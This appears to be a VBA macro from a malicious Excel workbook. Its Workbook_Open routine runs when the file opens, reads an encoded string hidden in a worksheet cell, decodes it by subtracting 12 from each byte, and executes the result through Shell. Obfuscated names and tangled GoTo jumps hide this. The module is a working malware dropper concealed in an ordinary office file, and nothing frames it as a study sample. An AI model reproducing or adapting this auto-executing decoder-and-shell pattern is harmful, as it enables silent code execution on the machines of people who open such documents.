Option Explicit
Public Mohair       As String
Private Sub Init()
    
    Mohair = Sheets("vMYVb").Cells(134, 8).Value
    
    Guildsman
    
End Sub

Sub Workbook_Open()
    
    Call Init
    
End Sub

Private Sub Guildsman()
    
    Dim Donga       As Long: Dim Hidrosis() As Byte
    
    Hidrosis = StrConv(Mohair, 128)
    
    GoTo Unrazored
    
    Exit Sub
    
    Unrazored:
    
    If Donga < UBound(Hidrosis) Then
        
        Hidrosis(Donga) = Hidrosis(Donga) - 12: Donga = Donga + 1
        GoTo Unrazored
        
    Else
        
        GoTo Recidivated
        
    End If
    Dissection:
    Shell Mohair
    Exit Sub
    
    Recidivated:
    
    Mohair = StrConv(Hidrosis, 64)
    
    GoTo Dissection
    
    Exit Sub
End Sub
